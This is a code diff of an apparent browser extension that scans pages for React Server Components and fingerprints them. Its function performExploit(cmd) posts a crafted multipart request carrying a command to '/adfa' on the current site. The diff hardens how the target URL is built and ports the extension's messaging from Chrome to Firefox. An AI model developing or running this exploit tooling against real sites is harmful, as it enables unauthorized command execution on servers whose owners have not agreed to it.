@@ -71,7 +71,11 @@ async function performExploit(cmd) {
         ''
     ].join('\r\n');
 
-    const targetUrl = "/adfa"; // 使用相对路径
+    const currentUrl = new URL(window.location.href);
+    if (!/^https?:$/i.test(currentUrl.protocol)) {
+        throw new Error("Current page does not support network requests");
+    }
+    const targetUrl = new URL("/adfa", currentUrl.origin).toString();
 
     try {
         const res = await fetch(targetUrl, {
@@ -134,9 +138,9 @@ async function performExploit(cmd) {
 
 // === 消息监听与初始化 ===
 const passiveData = performPassiveScan();
-if(passiveData.isRSC) chrome.runtime.sendMessage({ action: "update_badge" });
+if(passiveData.isRSC) browser.runtime.sendMessage({ action: "update_badge" });
 
-chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
+browser.runtime.onMessage.addListener((req, sender, sendResponse) => {
     if (req.action === "get_passive") sendResponse(passiveData);
     if (req.action === "run_fingerprint") {
         performFingerprint().then(res => sendResponse(res));
